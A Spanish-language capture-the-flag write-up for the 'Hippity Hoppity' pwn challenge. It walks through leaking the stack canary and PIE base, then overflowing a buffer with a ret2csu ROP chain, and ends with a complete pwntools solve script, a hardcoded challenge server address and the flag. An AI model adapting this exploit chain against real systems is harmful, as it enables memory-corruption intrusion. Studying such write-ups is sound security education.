# Hippity Hoppity

**Category:** PWN
**Flag:** `EH4X{r0pp3d_th3_w0mp3d}`

## Description

> Hippity hoppity the flag is not your property

## TL;DR

Info leaks en dos stages permiten filtrar el **stack canary** y la **base PIE**. Un buffer overflow masivo en el tercer stage permite montar una cadena **ret2csu** para controlar `rdx` (no hay gadget `pop rdx`) y gadgets `pop rdi`/`pop rsi` para los otros dos registros, llamando a `emit_report()` con tres constantes mágicas que hacen que lea e imprima `flag.txt`.

## Analysis

### Binary protections

```
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
RPATH:    b'.'
```

El binario carga `libcoreio.so` desde el directorio actual (RPATH=`.`).

### Flujo del programa

El `main` llama secuencialmente a tres funciones:

```
main → bootstrap_state → submit_note → review_note → finalize_entry
```

#### 1. `submit_note` (0x9b7) — Info leak: canary

```c
// Buffer de 0x48 bytes (rbp-0x50 a rbp-0x08), canary en rbp-0x08
char buf[0x48];  // en rbp-0x50
read(0, buf, 0x40);            // lee 0x40 bytes
write(1, "[LOG] Entry received: ", 0x16);
write(1, buf, 0x58);           // escribe 0x58 bytes → LEAK de 0x10 bytes extra
```

- El `read` lee 0x40 bytes en el buffer.
- El `write` escribe **0x58 bytes** desde el inicio del buffer.
- Como el buffer tiene 0x48 bytes hasta el canary, los bytes `[0x48:0x50]` del output contienen el **canary** y `[0x50:0x58]` el saved rbp.

#### 2. `review_note` (0xa53) — Info leak: PIE base

```c
char buf[0x20];                     // en rbp-0x30
void (*fn)() = finalize_note;       // en rbp-0x10 → puntero a finalize_note (PIE+0x980)
read(0, buf, 0x20);
write(1, "[PROC] Processing: ", 0x13);
write(1, buf, 0x30);               // escribe 0x30 bytes → LEAK del puntero a función
```

- `write` saca **0x30 bytes** desde buf (que tiene 0x20 bytes).
- Los bytes `[0x20:0x28]` contienen la dirección de `finalize_note` → **PIE base = leak - 0x980**.

#### 3. `finalize_entry` (0xafa) — Buffer overflow

```c
long zero = 0;                      // rbp-0x50 (8 bytes, set to 0)
char buf[0x40];                     // rbp-0x48 (input starts here)
// canary en rbp-0x08
read(0, &buf, 0x190);              // lee 0x190 bytes en 0x40 bytes de buffer → OVERFLOW
write(1, "[VULN] Done.\n", 0xd);
```

- `read` permite escribir **0x190 bytes** (400) en un buffer de **0x40 bytes** (64).
- Offset de input a canary: **0x40 bytes**.
- Offset de input a return address: **0x50 bytes**.

### `emit_report` en libcoreio.so

La función `emit_report(rdi, rsi, rdx)` compara los tres argumentos con constantes mágicas:

```c
if (rdi == 0xdeadbeefdeadbeef &&
    rsi == 0xcafebabecafebabe &&
    rdx == 0xd00df00dd00df00d) {
    fd = open("flag.txt", O_RDONLY);
    n = read(fd, buf, 0x100);
    write(1, buf, n);    // imprime el flag
    close(fd);
    _exit(0);
}
// Si falla algún check:
write(1, "Invalid request.\n", 0x11);
_exit(1);
```

## Solution

### Problema: no hay `pop rdx; ret`

El binario es pequeño y no tiene gadget `pop rdx`. Sin embargo, el epílogo de `__libc_csu_init` nos da control sobre rdx:

```asm
; csu_call (PIE+0xc80):
mov    rdx, r13        ; rdx = r13 (64-bit completo!)
mov    rsi, r14        ; rsi = r14
mov    edi, r15d       ; edi = r15d (solo 32-bit → no sirve para rdi=0xdeadbeefdeadbeef)
call   *(r12 + rbx*8)  ; call indirecto

; csu_pop (PIE+0xc96):
add    rsp, 8
pop    rbx; pop rbp; pop r12; pop r13; pop r14; pop r15
ret
```

### Estrategia: ret2csu + pop gadgets

1. **ret2csu** para poner `rdx = 0xd00df00dd00df00d` (vía r13), llamando a `frame_dummy` (función benigna apuntada por `.init_array`).
2. Tras ret2csu, usar **`pop rdi; ret`** (PIE+0xca3, gadget desalineado de `pop r15; ret`) para rdi.
3. Usar **`pop rsi; pop r15; ret`** (PIE+0xca1) para rsi.
4. Llamar a **`emit_report@plt`** (PIE+0x838) — rdx se preserva a través de los pops y el PLT jmp.

### Cadena ROP completa

```
┌─────────────────────────────────────────────┐
│ 'C' * 0x40                    (padding)     │
│ canary                        (restaurar)   │
│ 0x0                           (saved rbp)   │
├─────────────────────────────────────────────┤
│ csu_pop  (PIE+0xc96)                        │
│ 0x0                     (add rsp,8 skip)    │
│ 0x0                     (rbx = 0)           │
│ 0x1                     (rbp = 1)           │
│ .init_array             (r12 → frame_dummy) │
│ 0xd00df00dd00df00d      (r13 → rdx)         │
│ 0x0                     (r14)               │
│ 0x0                     (r15)               │
├─────────────────────────────────────────────┤
│ csu_call (PIE+0xc80)                        │
│   → mov rdx,r13; call frame_dummy; return   │
│   → rbx=1, rbp=1 → loop exits              │
│   → falls through to csu_pop               │
├─────────────────────────────────────────────┤
│ 0x0 * 7                (skip + 6 pops)      │
├─────────────────────────────────────────────┤
│ pop_rdi  (PIE+0xca3)                        │
│ 0xdeadbeefdeadbeef     (rdi = ARG1)         │
├─────────────────────────────────────────────┤
│ pop_rsi_r15  (PIE+0xca1)                    │
│ 0xcafebabecafebabe     (rsi = ARG2)         │
│ 0x0                    (r15 = junk)          │
├─────────────────────────────────────────────┤
│ emit_report@plt  (PIE+0x838)                │
│   → rdx aún = ARG3 → abre flag.txt         │
└─────────────────────────────────────────────┘
```

### Prerequisites

```bash
pip install pwntools --break-system-packages
```

### Solve Script

```python
#!/usr/bin/env python3
# solve.py — hippity-hoppity solver
# Usage: python3 solve.py [REMOTE_HOST REMOTE_PORT]

from pwn import *
import sys

context.arch = 'amd64'
context.log_level = 'info'

HOST = sys.argv[1] if len(sys.argv) >= 3 else '20.244.7.184'
PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 1337

ARG1 = 0xdeadbeefdeadbeef
ARG2 = 0xcafebabecafebabe
ARG3 = 0xd00df00dd00df00d

OFF_FINALIZE_NOTE   = 0x980
OFF_CSU_CALL        = 0xc80
OFF_CSU_POP         = 0xc96
OFF_POP_RDI         = 0xca3
OFF_POP_RSI_R15     = 0xca1
OFF_EMIT_REPORT_PLT = 0x838
OFF_INIT_ARRAY      = 0x201d98

def exploit():
    p = remote(HOST, PORT)
    p.recvuntil(b'Process log entry\n')

    # Stage 1: leak canary
    p.recvuntil(b'Input log entry: ')
    p.send(b'A' * 0x40)
    p.recvuntil(b'[LOG] Entry received: ')
    leak1 = p.recv(0x58)
    canary = u64(leak1[0x48:0x50])
    log.info(f'Canary: {hex(canary)}')

    # Stage 2: leak PIE base
    p.recvuntil(b'Input processing note: ')
    p.send(b'B' * 0x20)
    p.recvuntil(b'[PROC] Processing: ')
    leak2 = p.recv(0x30)
    pie_base = u64(leak2[0x20:0x28]) - OFF_FINALIZE_NOTE
    log.info(f'PIE base: {hex(pie_base)}')

    # Stage 3: overflow + ROP
    csu_pop         = pie_base + OFF_CSU_POP
    csu_call        = pie_base + OFF_CSU_CALL
    pop_rdi         = pie_base + OFF_POP_RDI
    pop_rsi_r15     = pie_base + OFF_POP_RSI_R15
    emit_report_plt = pie_base + OFF_EMIT_REPORT_PLT
    init_array      = pie_base + OFF_INIT_ARRAY

    p.recvuntil(b'Send final payload: ')

    payload  = b'C' * 0x40 + p64(canary) + p64(0)

    # ret2csu: set rdx = ARG3
    payload += p64(csu_pop)
    payload += p64(0)            # skip
    payload += p64(0)            # rbx=0
    payload += p64(1)            # rbp=1
    payload += p64(init_array)   # r12 → frame_dummy
    payload += p64(ARG3)         # r13 → rdx
    payload += p64(0)            # r14
    payload += p64(0)            # r15
    payload += p64(csu_call)     # execute
    payload += p64(0) * 7        # skip + pops after call

    # set rdi, rsi, call emit_report
    payload += p64(pop_rdi) + p64(ARG1)
    payload += p64(pop_rsi_r15) + p64(ARG2) + p64(0)
    payload += p64(emit_report_plt)

    p.send(payload)

    result = p.recvall(timeout=5)
    print(result.decode(errors='replace'))

if __name__ == '__main__':
    exploit()
```

## Flag

```
EH4X{r0pp3d_th3_w0mp3d}
```
